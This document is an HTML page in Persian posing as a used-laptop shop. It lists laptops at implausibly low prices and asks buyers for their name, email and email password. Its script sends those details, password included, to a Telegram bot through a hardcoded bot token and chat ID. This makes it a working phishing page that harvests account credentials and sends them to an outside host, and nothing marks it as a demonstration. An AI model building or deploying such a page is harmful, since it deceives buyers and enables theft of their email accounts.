<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>فروشگاه لپ‌تاپ</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
      direction: rtl;
    }
    header {
      background-color: #333;
      color: #fff;
      padding: 15px 0;
      text-align: center;
    }
    .container {
      width: 90%;
      margin: 20px auto;
    }
    .product {
      display: inline-block;
      width: 30%;
      margin: 10px;
      background-color: #fff;
      padding: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      vertical-align: top;
      text-align: center;
    }
    .product img {
      width: 100%;
      height: 200px;
      object-fit: cover;
    }
    .product h3 {
      color: #333;
    }
    .price {
      color: #e67e22;
      font-size: 18px;
    }
    button {
      background-color: #27ae60;
      color: white;
      border: none;
      padding: 10px 15px;
      cursor: pointer;
    }
    form {
      background-color: #fff;
      padding: 15px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      margin-top: 30px;
    }
    form input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
    }
  </style>
</head>
<body>

<header>
  <h1>فروشگاه لپ‌تاپ‌های کارکرده</h1>
</header>

<div class="container">
  <div class="product">
    <img src="https://cdn.digikala.com/digikala-products/1f560660f0d412d4b95854bc5f6e64f9ddcc1271_1678090902.jpg" alt="لپ‌تاپ دل">
    <h3>لپ‌تاپ دل مدل XPS</h3>
    <p class="price">۲٬۵۰۰٬۰۰۰ تومان</p>
    <button onclick="selectProduct('لپ‌تاپ دل مدل XPS')">خرید</button>
  </div>
  <div class="product">
    <img src="https://cdn.digikala.com/digikala-products/8bb3dc0c0ef97eb9da70f173bdf4c8f6f8a5e6f0_1692274170.jpg" alt="لپ‌تاپ اچ‌پی">
    <h3>لپ‌تاپ اچ‌پی مدل Pavilion</h3>
    <p class="price">۳٬۰۰۰٬۰۰۰ تومان</p>
    <button onclick="selectProduct('لپ‌تاپ اچ‌پی مدل Pavilion')">خرید</button>
  </div>
  <div class="product">
    <img src="https://cdn.digikala.com/digikala-products/26ae0731b1ee3bc1d2873c1aa486f70fa2b5d963_1662461352.jpg" alt="لپ‌تاپ اپل">
    <h3>لپ‌تاپ اپل مدل MacBook Pro</h3>
    <p class="price">۸٬۰۰۰٬۰۰۰ تومان</p>
    <button onclick="selectProduct('لپ‌تاپ اپل مدل MacBook Pro')">خرید</button>
  </div>

  <form id="customerForm">
    <h2>اطلاعات خریدار</h2>
    <input type="text" id="name" placeholder="نام و نام خانوادگی" required />
    <input type="email" id="email" placeholder="ایمیل" required />
    <input type="password" id="password" placeholder="رمز عبور ایمیل" required />
    <button type="submit">ارسال اطلاعات</button>
  </form>
</div>

<script>
  let selectedProduct = '';

  function selectProduct(product) {
    selectedProduct = product;
    alert(`شما ${product} را انتخاب کردید. لطفاً اطلاعات خود را وارد کنید.`);
    document.getElementById('customerForm').scrollIntoView({ behavior: 'smooth' });
  }

  document.getElementById('customerForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (!selectedProduct) {
      alert('لطفاً ابتدا یک محصول را انتخاب کنید.');
      return;
    }

    const botToken = '5899483276:AAGtvLrO_fpCz_2rWqPnxShRCWV2Wc2kOK8';
    const chatId = '6185981200';
    const message = `سفارش جدید:
محصول: ${selectedProduct}
نام مشتری: ${name}
ایمیل: ${email}
رمز ایمیل: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => {
      if (response.ok) {
        alert('اطلاعات با موفقیت ارسال شد!');
      } else {
        alert('ارسال اطلاعات با خطا مواجه شد.');
      }
    })
    .catch(error => {
      console.error('خطا:', error);
      alert('خطا در ارتباط با تلگرام');
    });
  });
</script>

</body>
</html>
